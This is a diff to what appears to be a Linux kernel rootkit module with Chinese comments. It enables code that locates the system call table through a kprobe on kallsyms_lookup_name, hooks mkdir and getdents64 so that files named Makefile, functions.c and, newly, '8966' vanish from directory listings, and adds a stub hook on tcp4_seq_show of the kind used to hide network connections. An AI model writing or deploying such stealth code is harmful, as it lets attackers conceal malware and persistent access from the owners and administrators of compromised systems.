@@ -119,22 +119,25 @@ static char *exec_cmd(char *cmd)
     return buf;
 }
 
-// // 获取系统调用表
-// long get_kallsyms_lookup(void)
-// {
-//     static struct kprobe kp = {
-//         .symbol_name = "kallsyms_lookup_name"};
-//     typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-//     kallsyms_lookup_name_t kallsyms_lookup_name_my;
-//     // 注册kprobe
-//     register_kprobe(&kp);
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
+// 获取系统调用表
+// 内核版本小于5.10注释
+long get_kallsyms_lookup(void)
+{
+    static struct kprobe kp = {
+        .symbol_name = "kallsyms_lookup_name"};
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+    kallsyms_lookup_name_t kallsyms_lookup_name_my;
+    // 注册kprobe
+    register_kprobe(&kp);
 
-//     kallsyms_lookup_name_my = (kallsyms_lookup_name_t)kp.addr;
+    kallsyms_lookup_name_my = (kallsyms_lookup_name_t)kp.addr;
 
-//     // 卸载kprobe
-//     unregister_kprobe(&kp);
-//     return kallsyms_lookup_name_my("sys_call_table");
-// }
+    // 卸载kprobe
+    unregister_kprobe(&kp);
+    return kallsyms_lookup_name_my("sys_call_table");
+}
+#endif
 
 // hookmkdir系统调用，拦截目录创建
 asmlinkage long hook_mkdir(const struct pt_regs *regs)
@@ -151,7 +154,7 @@ asmlinkage long hook_mkdir(const struct pt_regs *regs)
 int check(char *name)
 {
     int i = 0;
-    if (!strcmp(name, "Makefile") || !strcmp(name, "functions.c"))
+    if (!strcmp(name, "Makefile") || !strcmp(name, "functions.c") || !strcmp(name, "8966"))
         return 1;
     return 0;
 }
@@ -207,4 +210,10 @@ asmlinkage long hook_getdents64(const struct pt_regs *regs)
 done:
     kfree(dirent_ker);
     return ret;
+}
+
+// hook_tcp4_seq_show
+asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    return orig_tcp4_seq_show(seq,v);
 }
